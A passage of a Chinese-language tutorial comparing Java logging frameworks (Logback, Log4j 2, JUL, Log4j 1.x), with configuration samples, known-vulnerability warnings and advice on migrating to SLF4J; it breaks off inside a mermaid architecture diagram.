<h4 id="3-1-2-核心特性"><a href="#3-1-2-核心特性" class="headerlink" title="3.1.2 核心特性"></a>3.1.2 核心特性</h4><h5 id="1-性能卓越，内存占用低"><a href="#1-性能卓越，内存占用低" class="headerlink" title="1. 性能卓越，内存占用低"></a>1. 性能卓越，内存占用低</h5><p>Logback 的内核经过了重写和深度优化。通过智能的算法和对内存的谨慎使用，它在日志吞吐量和资源消耗方面都表现出色。在许多基准测试中，Logback 的性能通常优于或持平于其他主流框架，使其非常适合高并发、低延迟的后端应用。</p>
<hr>
<h5 id="2-自动重载配置文件，无需重启应用"><a href="#2-自动重载配置文件，无需重启应用" class="headerlink" title="2. 自动重载配置文件，无需重启应用"></a>2. 自动重载配置文件，无需重启应用</h5><p>这是一个极具吸引力的运维特性。在生产环境中，我们经常需要临时调整日志级别来排查问题（比如将某个类的日志级别从 <code>INFO</code> 调到 <code>DEBUG</code>）。使用 Logback，你只需在配置文件的根节点 <code>&lt;configuration&gt;</code> 中添加 <code>scan=&quot;true&quot;</code> 属性即可：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span> <span class="attr">scanPeriod</span>=<span class="string">&quot;60 seconds&quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Logback 会启动一个后台线程，每隔一段时间（<code>scanPeriod</code>，默认1分钟）检查一次配置文件是否被修改。如果文件有变动，Logback 会自动、平滑地加载新配置，<strong>整个过程无需重启应用程序</strong>，极大提升了生产环境下的灵活性和问题响应速度。</p>
<hr>
<h5 id="3-强大的过滤器-Filters"><a href="#3-强大的过滤器-Filters" class="headerlink" title="3. 强大的过滤器 (Filters)"></a>3. 强大的过滤器 (Filters)</h5><p>除了基于日志级别的全局过滤，Logback 还提供了可以附加在 Appender 上的过滤器，实现更精细的日志控制。</p>
<ul>
<li><strong><code>LevelFilter</code></strong>：精确匹配某个级别，然后接受（<code>ACCEPT</code>）或拒绝（<code>DENY</code>）该日志。</li>
<li><strong><code>ThresholdFilter</code></strong>：过滤掉所有低于指定阈值的日志事件。</li>
<li><strong><code>TurboFilter</code></strong>：这是一个更高级的全局过滤器，可以基于 MDC、Marker、日志消息内容等多种信息来决定是否记录日志，甚至可以在日志事件产生前就进行过滤，性能极高。例如，你可以配置一个 <code>TurboFilter</code> 来过滤掉所有来自“健康检查”请求的日志，从而保持日志文件的干净。</li>
</ul>
<hr>
<h5 id="4-支持-Groovy-脚本配置"><a href="#4-支持-Groovy-脚本配置" class="headerlink" title="4. 支持 Groovy 脚本配置"></a>4. 支持 Groovy 脚本配置</h5><p>除了传统的 XML 格式，Logback 还允许你使用 Groovy 脚本（<code>logback.groovy</code>）来进行配置。这带来了巨大的灵活性，因为你可以在配置文件中使用<strong>编程逻辑</strong>：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// logback.groovy 示例</span></span><br><span class="line"><span class="keyword">import</span> ch.qos.logback.classic.PatternLayout</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用变量</span></span><br><span class="line"><span class="keyword">def</span> LOG_HOME = <span class="string">&quot;/var/log/myapp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用 if/else 条件逻辑</span></span><br><span class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">&quot;ENV&quot;</span>) == <span class="string">&quot;prod&quot;</span>) &#123;</span><br><span class="line">    root(INFO, [<span class="string">&quot;FILE&quot;</span>])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    root(DEBUG, [<span class="string">&quot;CONSOLE&quot;</span>, <span class="string">&quot;FILE&quot;</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">appender(<span class="string">&quot;FILE&quot;</span>, RollingFileAppender) &#123;</span><br><span class="line">    file = <span class="string">&quot;$&#123;LOG_HOME&#125;/app.log&quot;</span></span><br><span class="line">    <span class="comment">// ... 其他配置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方式使得创建动态的、环境感知的日志配置变得非常简单。</p>
<hr>
<h5 id="5-丰富的-Appender（特别是-SiftingAppender）"><a href="#5-丰富的-Appender（特别是-SiftingAppender）" class="headerlink" title="5. 丰富的 Appender（特别是 SiftingAppender）"></a>5. 丰富的 Appender（特别是 <code>SiftingAppender</code>）</h5><p>Logback 提供了多种多样的 Appender 用于将日志输出到不同目的地。除了常见的 <code>ConsoleAppender</code> 和 <code>RollingFileAppender</code>，它还有一个杀手级应用：<strong><code>SiftingAppender</code></strong>。</p>
<p><code>SiftingAppender</code> 是一个“筛选”或“分拣”Appender。它可以根据日志事件的某个特征（通常是 <strong>MDC</strong> 中的一个值），将日志动态地分发到不同的子 Appender 中。最经典的用例是<strong>按用户ID或会话ID生成独立的日志文件</strong>。</p>
<ul>
<li><strong>场景</strong>：在一个多租户SaaS应用中，你想为每个租户（<code>tenantId</code>）或每个用户（<code>userId</code>）记录独立的日志文件，以便于单独排查问题。</li>
<li><strong>实现</strong>：<ol>
<li>在请求处理的开始阶段，将 <code>tenantId</code> 放入 MDC：<code>MDC.put(&quot;tenantId&quot;, &quot;abc-corp&quot;);</code></li>
<li>配置 <code>SiftingAppender</code>，让它使用 <code>tenantId</code> 作为“分拣键”（discriminator）。</li>
<li><code>SiftingAppender</code> 会为每一个新的 <code>tenantId</code> 值（如 “abc-corp”, “xyz-inc”）动态地创建一个 <code>FileAppender</code>，并将日志写入对应的文件（如 <code>tenant-abc-corp.log</code>, <code>tenant-xyz-inc.log</code>）。</li>
</ol>
</li>
</ul>
<p>这个功能对于调试分布式系统或多用户环境下的特定问题非常有价值。</p>
<hr>
<h4 id="3-1-3-配置文件"><a href="#3-1-3-配置文件" class="headerlink" title="3.1.3 配置文件"></a>3.1.3 配置文件</h4><p>Logback 会在 classpath 下按以下顺序查找配置文件：</p>
<ol>
<li><code>logback-spring.xml</code> (如果使用了 Spring Boot，这个文件有最高优先级，并且可以使用 Spring 的高级特性，如 <code>&lt;springProfile&gt;</code>)</li>
<li><code>logback.groovy</code></li>
<li><code>logback.xml</code></li>
</ol>
<p>如果以上文件都找不到，Logback 会使用一个默认的基本配置，将 <code>DEBUG</code> 级别及以上的日志输出到控制台。在实际项目中，我们通常会提供一个 <code>logback-spring.xml</code> (在Spring Boot项目中) 或 <code>logback.xml</code> 文件来进行详细的自定义配置。</p>
<hr>
<h3 id="3-2-Log4j-2"><a href="#3-2-Log4j-2" class="headerlink" title="3.2 Log4j 2"></a>3.2 Log4j 2</h3><h4 id="3-2-1-简介"><a href="#3-2-1-简介" class="headerlink" title="3.2.1 简介"></a>3.2.1 简介</h4><p><strong>Apache Log4j 2</strong> 是对经典的 Log4j 1.x 的一次<strong>彻底的重新设计和重写</strong>。旨在解决 Log4j 1.x 中存在的架构问题，并大幅提升性能和灵活性。</p>
<p>Log4j 2 汲取了过去十几年日志框架发展的经验，融合了多项先进技术，其核心目标是成为<strong>市面上性能最高、扩展性最强</strong>的 Java 日志框架。它与 Log4j 1.x <strong>完全不兼容</strong>，并且已经修复了 Log4j 1.x 和 Log4j 2 早期版本中发现的著名安全漏洞（如 Log4Shell），是安全可靠的选择。</p>
<hr>
<h4 id="3-2-2-核心特性"><a href="#3-2-2-核心特性" class="headerlink" title="3.2.2 核心特性"></a>3.2.2 核心特性</h4><h5 id="1-异步日志"><a href="#1-异步日志" class="headerlink" title="1. 异步日志"></a>1. 异步日志</h5><p>这是 Log4j 2 最具标志性的特性。传统的异步日志（如 Logback 的 <code>AsyncAppender</code>）通常基于 <code>BlockingQueue</code> 实现，在高并发下仍然存在锁竞争。Log4j 2 则更进一步，引入了在金融交易领域闻名的<strong>无锁并发框架 LMAX Disruptor</strong>。</p>
<ul>
<li><strong>工作原理</strong>：当应用程序调用 <code>logger.info()</code> 时，Log4j 2 仅将日志事件的所有数据发布到一个环形缓冲区（Ring Buffer）中，这个过程是<strong>无锁</strong>的，速度极快。然后，一个独立的后台线程会从缓冲区中消费事件，并完成日志的格式化和写入磁盘等耗时操作。</li>
<li><strong>优势</strong>：<ul>
<li><strong>极高的吞吐量和极低的延迟</strong>：日志调用的开销被降到最低，对主业务线程几乎没有阻塞影响，使得应用的整体吞吐量得到巨大提升。其性能比传统的异步日志方案高出一个数量级。</li>
<li><strong>两种模式</strong>：<ul>
<li><strong>全局异步 (All Loggers Async)</strong>：通过一个系统属性即可让应用中的<strong>所有 Logger</strong> 都变成异步模式，配置极其简单。</li>
<li><strong>混合异步 (Mixed Sync&#x2F;Async)</strong>：可以精确地将某些 Logger 配置为异步，而其他 Logger 保持同步，提供了更细粒度的控制。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-插件化架构"><a href="#2-插件化架构" class="headerlink" title="2. 插件化架构"></a>2. 插件化架构</h5><p>Log4j 2 的整个架构都是基于插件构建的。无论是 <code>Appender</code>、<code>Layout</code>、<code>Filter</code> 还是 <code>Logger</code>，它们在内部都被视为插件。</p>
<ul>
<li><strong>优势</strong>：<ul>
<li><strong>极强的可扩展性</strong>：开发者可以非常方便地创建自己的自定义组件（如自定义一个发送日志到企业微信的 Appender），只需遵循 Log4j 2 的插件注解规范即可。框架会自动发现并集成这些自定义插件，无需繁琐的编码配置。</li>
<li><strong>配置灵活</strong>：因为一切皆插件，配置文件的语法也因此变得非常统一和强大。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-支持多种配置文件格式"><a href="#3-支持多种配置文件格式" class="headerlink" title="3. 支持多种配置文件格式"></a>3. 支持多种配置文件格式</h5><p>相较于 Logback 主要依赖 XML，Log4j 2 提供了更广泛的配置格式支持，以适应不同团队的技术偏好：</p>
<ul>
<li><strong>XML</strong> (<code>log4j2.xml</code>)：最常用，功能最全，支持 XSD 校验。</li>
<li><strong>JSON</strong> (<code>log4j2.json</code>)</li>
<li><strong>YAML</strong> (<code>log4j2.yaml</code>)：对于熟悉 YAML 的开发者（如 Kubernetes 用户）来说非常友好。</li>
<li><strong>Properties</strong> (<code>log4j2.properties</code>)：语法简单，但功能受限。</li>
</ul>
<p>这种灵活性使得 Log4j 2 能更好地融入不同的技术生态。</p>
<hr>
<h5 id="4-无垃圾-Garbage-free-和低垃圾-Low-garbage-模式"><a href="#4-无垃圾-Garbage-free-和低垃圾-Low-garbage-模式" class="headerlink" title="4. 无垃圾 (Garbage-free) 和低垃圾 (Low-garbage) 模式"></a>4. 无垃圾 (Garbage-free) 和低垃圾 (Low-garbage) 模式</h5><p>为了避免因日志记录产生大量临时对象而引发 GC（垃圾回收）停顿，Log4j 2 在这方面做了极致的优化。</p>
<ul>
<li><strong>工作原理</strong>：通过大量使用 <code>ThreadLocal</code> 缓存和对象重用（Object Pooling）技术，Log4j 2 在日志记录的全过程中尽可能避免创建新的临时对象（如 <code>StringBuilder</code>, <code>byte[]</code> 等）。</li>
<li><strong>优势</strong>：在对 GC 停顿极其敏感的应用中（如低延迟交易系统、实时游戏服务器），开启此模式可以显著减少 GC 压力，提升应用的响应稳定性和可预测性。</li>
<li><strong>注意</strong>：此模式在特定配置下（如全局异步）默认开启，但在某些情况下可能需要手动配置。</li>
</ul>
<hr>
<h5 id="5-Lambda-表达式支持延迟日志记录"><a href="#5-Lambda-表达式支持延迟日志记录" class="headerlink" title="5. Lambda 表达式支持延迟日志记录"></a>5. Lambda 表达式支持延迟日志记录</h5><p>除了SLF4J风格的 <code>{}</code> 占位符，Log4j 2 还利用 Java 8 的 Lambda 表达式，提供了另一种优雅的延迟日志记录方式。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 Lambda 表达式</span></span><br><span class="line"><span class="comment">// 只有在 DEBUG 级别启用时，`expensiveOperation()` 方法才会被调用</span></span><br><span class="line">logger.debug(() -&gt; <span class="string">&quot;Log message from &quot;</span> + expensiveOperation());</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">expensiveOperation</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 这是一个耗时的操作...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;some result&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Lambda 表达式体内的代码（包括 <code>expensiveOperation()</code> 方法的调用和字符串拼接）只有在日志级别检查通过后才会被执行，其效果与 <code>{}</code> 占位符类似，但在需要执行复杂逻辑来生成日志消息时，代码可读性更强。</p>
<hr>
<h4 id="3-2-3-配置文件与版本说明"><a href="#3-2-3-配置文件与版本说明" class="headerlink" title="3.2.3 配置文件与版本说明"></a>3.2.3 配置文件与版本说明</h4><ul>
<li><strong>配置文件</strong>：Log4j 2 启动时会在 classpath 中按顺序查找以下文件：<code>log4j2-test.properties</code>, <code>log4j2-test.yaml</code>, <code>log4j2-test.json</code>, <code>log4j2-test.xml</code>, <code>log4j2.properties</code>, <code>log4j2.yaml</code>, <code>log4j2.json</code>, <code>log4j2.xml</code>。在 Spring Boot 环境中，推荐使用 <code>log4j2-spring.xml</code>。</li>
<li><strong>重要注意</strong>：<ul>
<li><strong>不兼容 Log4j 1.x</strong>：配置文件语法、API 调用方式完全不同，迁移需要重写配置和修改代码（如果直接使用了 Log4j 1.x API）。</li>
<li><strong>修复了历史安全漏洞</strong>：臭名昭著的 “Log4Shell” (CVE-2021-44228) 等漏洞影响的是 Log4j 2 的早期版本 (2.0-beta9 到 2.14.1)。务必使用<strong>官方推荐的最新稳定版本</strong>，以确保安全性。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-3-JUL-java-util-logging"><a href="#3-3-JUL-java-util-logging" class="headerlink" title="3.3 JUL (java.util.logging)"></a>3.3 JUL (java.util.logging)</h3><h4 id="3-3-1-简介"><a href="#3-3-1-简介" class="headerlink" title="3.3.1 简介"></a>3.3.1 简介</h4><p><strong>JUL (java.util.logging)</strong> 是自 JDK 1.4 版本起就作为标准库被内置在 Java SE 平台中的官方日志框架。它最显著的特点就是<strong>无处不在</strong>：只要你安装了 JDK，你就拥有了 JUL。开发者无需添加任何外部的 <code>jar</code> 包依赖，即可在代码中使用日志功能。</p>
<p>它的核心组件包括：</p>
<ul>
<li><strong><code>Logger</code></strong>: 日志记录器，用于发布日志记录。</li>
<li><strong><code>Handler</code></strong>: 日志处理器，类似于其他框架中的 Appender，决定日志的输出目的地（如控制台 <code>ConsoleHandler</code>、文件 <code>FileHandler</code>）。</li>
<li><strong><code>Formatter</code></strong>: 日志格式化器，类似于 Layout，定义日志的输出格式（如 <code>SimpleFormatter</code>、<code>XMLFormatter</code>）。</li>
</ul>
<hr>
<h4 id="3-3-2-优点"><a href="#3-3-2-优点" class="headerlink" title="3.3.2 优点"></a>3.3.2 优点</h4><p>JUL 唯一的、也是最核心的优势在于其<strong>零依赖</strong>的特性。</p>
<ul>
<li><strong>轻量级</strong>：对于一些需要严格控制依赖数量和 <code>jar</code> 包大小的场景，比如开发一个简单的命令行工具、一个基础工具库（不希望强加给使用者一个特定的日志框架），或者在某些受限的嵌入式环境中，JUL 是一个便捷的选择。</li>
<li><strong>开箱即用</strong>：无需配置 Maven&#x2F;Gradle，直接在代码中 <code>import java.util.logging.Logger;</code> 即可开始使用，对于快速原型验证或编写小型测试程序非常方便。</li>
</ul>
<hr>
<h4 id="3-3-3-缺点"><a href="#3-3-3-缺点" class="headerlink" title="3.3.3 缺点"></a>3.3.3 缺点</h4><p>尽管 JUL 具有零依赖的优点，但与 Logback、Log4j 2 等现代日志框架相比，其在功能、性能和灵活性方面都存在显著的不足，这使得它几乎不适用于任何严肃的企业级应用开发。</p>
<ul>
<li><p><strong>功能简单</strong>：</p>
<ul>
<li><strong>没有日志门面</strong>：JUL 本身就是一个实现，直接使用它会导致代码与实现强耦合。</li>
<li><strong>简陋的 API</strong>：<strong>不支持参数化占位符 <code>{}</code></strong>。日志拼接必须手动完成，这既不美观也存在性能问题。为了避免不必要的字符串拼接开销，你必须手动进行级别检查，代码非常冗余：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不推荐的方式，无论级别是否满足，都会执行字符串拼接</span></span><br><span class="line">logger.fine(<span class="string">&quot;User &quot;</span> + userId + <span class="string">&quot; is processing data.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了性能，必须这样写，非常繁琐</span></span><br><span class="line"><span class="keyword">if</span> (logger.isLoggable(Level.FINE)) &#123;</span><br><span class="line">    logger.fine(<span class="string">&quot;User &quot;</span> + userId + <span class="string">&quot; is processing data.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>功能缺失</strong>：缺少许多现代框架的标配功能，如 MDC (诊断上下文映射)、Marker、强大的过滤器（如 <code>SiftingAppender</code>）、自动重载配置、基于 Groovy&#x2F;YAML 的高级配置等。</li>
</ul>
</li>
<li><p><strong>性能一般</strong>：</p>
<ul>
<li>JUL 的默认实现基本上是同步阻塞模型，在高并发下进行文件写入等 IO 操作时，会对业务线程造成阻塞，影响应用吞吐量。</li>
<li>它没有内置高性能的异步日志记录器，也缺乏 Log4j 2 那样的无垃圾（Garbage-free）优化。</li>
</ul>
</li>
<li><p><strong>配置不灵活</strong>：</p>
<ul>
<li>JUL 主要通过一个全局的 <code>.properties</code> 文件（通常是 JRE 目录下的 <code>logging.properties</code>）或通过代码进行配置。</li>
<li><code>.properties</code> 文件的表现力远不如 XML 或 YAML，无法实现复杂的逻辑和结构。</li>
<li>修改配置文件后，通常需要<strong>重启 JVM 才能生效</strong>，这在生产环境中是不可接受的。虽然可以通过代码实现动态加载，但过程非常繁琐。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-3-4-使用场景与当前定位"><a href="#3-3-4-使用场景与当前定位" class="headerlink" title="3.3.4 使用场景与当前定位"></a>3.3.4 使用场景与当前定位</h4><p>基于以上缺点，JUL 的适用场景非常有限。</p>
<ul>
<li><strong>推荐使用场景</strong>：<ul>
<li>开发一个非常简单的、独立的、对性能和功能要求不高的<strong>单体桌面应用或命令行工具</strong>。</li>
<li>编写一个<strong>基础类库</strong>，为了保持零依赖性，选择使用 JUL。但更好的做法是使用 <code>slf4j-api</code>，让库的使用者自己去选择日志实现。</li>
</ul>
</li>
<li><strong>在企业级应用中的定位</strong>：<br>在现代后端开发（特别是微服务和 Web 应用）中，我们<strong>几乎从不主动选择 JUL 作为应用的日志框架</strong>。它的存在更多是因为一些 JDK 内部组件或古老的第三方库在使用它。<br>在这种情况下，我们的目标不是使用它，而是<strong>管理</strong>它。通过 SLF4J 提供的桥接器 <strong><code>jul-to-slf4j</code></strong>，我们可以将所有 JUL 的日志输出重定向到我们项目统一的日志系统（如 Logback 或 Log4j 2）中，从而实现日志的统一管理、格式化和输出。</li>
</ul>
<hr>
<h3 id="3-4-Log4j-1-x"><a href="#3-4-Log4j-1-x" class="headerlink" title="3.4 Log4j 1.x"></a>3.4 Log4j 1.x</h3><h4 id="3-4-1-简介"><a href="#3-4-1-简介" class="headerlink" title="3.4.1 简介"></a>3.4.1 简介</h4><p><strong>Apache Log4j 1.x</strong> (通常简称为 Log4j) 是 Java 历史上<strong>最具影响力的日志框架</strong>，没有之一。在它出现的年代，它以其强大的功能和灵活的配置，迅速取代了简陋的 <code>System.out.println</code>，成为了企业级 Java 应用开发的<strong>事实标准</strong>。</p>
<p>它开创性地提出了沿用至今的核心概念：</p>
<ul>
<li><strong>Logger (记录器)</strong>：定义日志的来源和级别。</li>
<li><strong>Appender (输出源)</strong>：将日志输出到控制台、文件等不同目的地。</li>
<li><strong>Layout (布局)</strong>：控制日志的输出格式。</li>
</ul>
<p>几乎所有后来的日志框架，包括 Logback 和 Log4j 2，都在设计上受到了 Log4j 1.x 的深刻影响。在很长一段时间里，它都是 Java 开发者工具箱中不可或缺的一部分，因此在大量的老旧项目和第三方 库中，你依然能看到它的身影。</p>
<hr>
<h4 id="3-4-2-当前状态"><a href="#3-4-2-当前状态" class="headerlink" title="3.4.2 当前状态"></a>3.4.2 当前状态</h4><p>尽管 Log4j 1.x 拥有辉煌的过去，但它的时代已经彻底结束。</p>
<ul>
<li><strong>官方停止维护 (End of Life - EOL)</strong>：Apache 软件基金会已于 <strong>2015 年 8 月</strong> 正式宣布 Log4j 1.x 停止维护。这意味着：<ul>
<li>不再有任何新的功能开发。</li>
<li>不再有任何 Bug 修复。</li>
<li><strong>最重要的是：不再提供任何安全补丁。</strong></li>
</ul>
</li>
<li><strong>存在已知的、未修复的严重安全漏洞</strong>：由于已停止维护，Log4j 1.x 中发现的多个安全漏洞将<strong>永远不会被修复</strong>。继续使用它，相当于将你的应用程序暴露在已知的安全风险之下。其中最著名的漏洞包括：<ul>
<li><strong><code>CVE-2019-17571</code></strong>: Log4j 1.x 中的 <code>SocketServer</code> 组件存在反序列化漏洞，远程攻击者可以利用该漏洞执行任意代码。</li>
<li><strong><code>CVE-2021-4104</code></strong>: 当 Log4j 1.x 配置为使用 <code>JMSAppender</code> 时，也可能受到类似 Log4Shell 的 JNDI 注入攻击。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-4-3-建议"><a href="#3-4-3-建议" class="headerlink" title="3.4.3 建议"></a>3.4.3 建议</h4><ul>
<li><p><strong>严禁在新项目中使用</strong>：<br>在任何新启动的项目中，<strong>绝对、完全、无条件地禁止</strong>使用 Log4j 1.x。没有任何理由可以为在新项目中使用一个已停止维护近十年且存在已知漏洞的库进行辩护。请直接选择 <code>SLF4J + Logback</code> 或 <code>SLF4J + Log4j 2</code>。</p>
</li>
<li><p><strong>老项目应尽快迁移</strong>：<br>如果现有项目或其依赖项中仍在使用 Log4j 1.x，应将其视为一个<strong>高优先级的技术债务和安全漏洞</strong>，并制定明确的迁移计划。</p>
<p><strong>推荐的迁移策略——使用 SLF4J 桥接</strong>：<br>迁移并不一定意味着要重写所有调用 Log4j 1.x API 的代码。SLF4J 提供了完美的解决方案：<code>log4j-over-slf4j</code> 桥接包。</p>
<p><strong>迁移步骤：</strong></p>
<ol>
<li><p><strong>添加桥接器</strong>：在你的 Maven 或 Gradle 配置中，添加 <code>log4j-over-slf4j</code> 依赖。这个包里包含了与 Log4j 1.x 完全相同的类和方法签名，但其内部实现是把调用转发给 SLF4J。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>排除原始 Log4j 1.x</strong>：在你的构建文件中，<strong>必须</strong>找到并排除所有对原始 <code>log4j:log4j</code> 包的依赖。这是为了防止类路径冲突和无限循环调用。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>some.legacy.library<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>legacy-artifact<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>引入新的日志实现</strong>：添加一个现代的日志实现作为 SLF4J 的后端，如 <code>logback-classic</code>。</p>
</li>
<li><p><strong>转换配置文件</strong>：将你的 <code>log4j.properties</code> 或 <code>log4j.xml</code> 配置文件转换为 <code>logback.xml</code> 或 <code>log4j2.xml</code> 的格式。</p>
</li>
</ol>
<p>通过这种方式，即使代码或第三方库仍在调用 Log4j 1.x 的 API，这些调用也会被 <code>log4j-over-slf4j</code> “欺骗”并无缝地重定向到 SLF4J，最终由你选择的现代、安全的日志后端（如 Logback）来处理。这是一种低风险、高收益的平滑迁移方案。</p>
</li>
</ul>
<hr>
<h2 id="4-最佳实践与高级用法"><a href="#4-最佳实践与高级用法" class="headerlink" title="4. 最佳实践与高级用法"></a>4. 最佳实践与高级用法</h2><h3 id="4-1-统一日志体系"><a href="#4-1-统一日志体系" class="headerlink" title="4.1 统一日志体系"></a>4.1 统一日志体系</h3><p>在任何一个依赖关系稍复杂的 Java 项目中，由于引入的第三方库可能使用了五花八门的日志框架（Log4j, JCL, JUL等），最终会导致应用的 classpath 下存在多套日志实现。这种混乱的局面被称为**“日志分裂”<strong>或</strong>“日志孤岛”**。</p>
<p><strong>不统一日志体系的危害：</strong></p>
<ul>
<li><strong>配置噩梦</strong>：需要维护多份配置文件（<code>log4j.properties</code>, <code>logback.xml</code>, <code>logging.properties</code>），它们之间互不相干，管理困难。</li>
<li><strong>格式混乱</strong>：不同框架输出的日志格式千差万别，难以进行统一的解析和监控。</li>
<li><strong>输出分散</strong>：日志可能被输出到不同的文件或控制台流中，排查问题时需要到处查找。</li>
<li><strong>性能与安全隐患</strong>：无法禁止项目中使用的老旧、不安全的日志实现（如 Log4j 1.x），留下技术债务和安全风险。</li>
<li><strong>控制失效</strong>：无法通过一个统一的配置来动态调整整个应用（包括所有三方库）的日志级别。</li>
</ul>
<p>因此，建立一个统一的日志体系，是保障项目健壮性和可维护性的<strong>必要步骤</strong>。</p>
<hr>
<h4 id="4-1-1-目标：单一入口，统一管理"><a href="#4-1-1-目标：单一入口，统一管理" class="headerlink" title="4.1.1 目标：单一入口，统一管理"></a>4.1.1 目标：单一入口，统一管理</h4><p>统一日志体系的目标非常明确：让应用程序中<strong>所有</strong>的日志输出（无论来自我们自己的代码还是第三方库）都通过一个<strong>唯一的日志门面（SLF4J）</strong>，再由这个门面委派给一个**唯一的日志实现（Logback 或 Log4j 2）**进行处理。</p>
<p><strong>理想的日志体系架构图：</strong></p>
<pre><code class="highlight mermaid">graph LR
    %% 定义样式
    classDef lib fill:#E6F3FF,stroke:#006DCC,stroke-width:2px;
    classDef api fill:#FFF2CC,stroke:#D6B656,stroke-width:1px;
    classDef bridge fill:#D5E8D4,stroke:#82B366,stroke-width:2px;
    classDef app fill:#DAE8FC,stroke:#6C8EBF,stroke-width:2px;
    classDef slf4jCore fill:#F8CECC,stroke:#B85450,stroke-width:3px;
    classDef logback fill:#FFE6CC,stroke:#D79B00,stroke-width:2px;

    %% 定义子图 (Subgraphs)
    subgraph 第三方库及其日志API
        LibA[&quot;第三方库 A&quot;]:::lib
        Log4jApi[&quot;Log4j 1.x API&quot;]:::api
        LibB[&quot;第三方库 B&quot;]:::lib
        JclApi[&quot;JCL API&quot;]:::api
        LibC[&quot;第三方库 C&quot;]:::lib
        JulApi[&quot;JUL API&quot;]:::api
    end

    subgraph &quot;SLF4J桥接层[SLF4J 桥接层 (Bridges)]&quot;
        Log4jBridge[&quot;log4j-over-slf4j&quot;]:::bridge
        JclBridge[&quot;jcl-over-slf4j&quot;]:::bridge
        JulBridge[&quot;jul-to-slf4j&quot;]:::bridge
    end

    subgraph 你的应用与SLF4J
        MyApp[&quot;你的应用代码&quot;]:::app
